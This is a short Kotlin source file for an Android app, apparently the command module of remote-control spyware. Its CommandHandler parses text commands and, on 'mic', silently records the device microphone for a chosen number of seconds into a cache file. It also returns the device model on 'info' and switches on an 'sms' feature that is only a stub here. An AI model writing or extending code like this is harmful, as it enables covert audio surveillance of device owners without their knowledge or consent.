package com.tom.app
import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import java.io.File

class CommandHandler(private val ctx: Context) {
    fun execute(cmd: String): String {
        val p = cmd.split(" ", limit = 2)
        val op = p[0].lowercase()
        val arg = if (p.size > 1) p[1] else ""
        return when (op) {
            "info" -> "model=${Build.MODEL}"
            "mic" -> mic(arg.toIntOrNull() ?: 10)
            "sms" -> "sms-on"
            else -> "unknown"
        }
    }
    private fun mic(sec: Int): String {
        val f = File(ctx.cacheDir, "rec.m4a")
        val rec = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
        rec.setAudioSource(MediaRecorder.AudioSource.MIC)
        rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        rec.setOutputFile(f.absolutePath)
        rec.prepare(); rec.start()
        Thread.sleep(sec * 1000L)
        rec.stop(); rec.release()
        return "file:${f.absolutePath}"
    }
}
